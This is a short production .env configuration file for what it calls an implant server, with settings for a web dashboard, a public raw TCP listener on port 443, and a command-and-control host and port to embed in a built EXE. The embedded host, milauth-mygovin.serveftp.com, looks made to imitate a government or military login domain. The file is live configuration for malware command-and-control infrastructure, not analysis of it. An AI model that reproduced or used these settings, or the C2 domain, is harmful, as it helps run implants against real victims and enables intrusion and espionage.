# cp .env.example.production .env.production

APP_ENV=production
NODE_ENV=production

# Web dashboard (keep 5000 if nginx/https uses 443 for the panel)
HOST=127.0.0.1
PORT=5000

# Implant raw TCP on public 443 — MUST be 0.0.0.0 (not 127.0.0.1)
TCP_HOST=0.0.0.0
TCP_PORT=443

# What gets embedded in the EXE (must match TCP_PORT when not using split)
BUILD_C2_HOST=milauth-mygovin.serveftp.com
BUILD_C2_PORT=443

# Turn OFF split unless router maps public 443 → another local port
ENABLE_443_SPLIT=0

CORS_ORIGIN=https://milauth-mygovin.serveftp.com,http://milauth-mygovin.serveftp.com

JWT_SECRET=CHANGE_ME
EMAIL_ENABLED=false
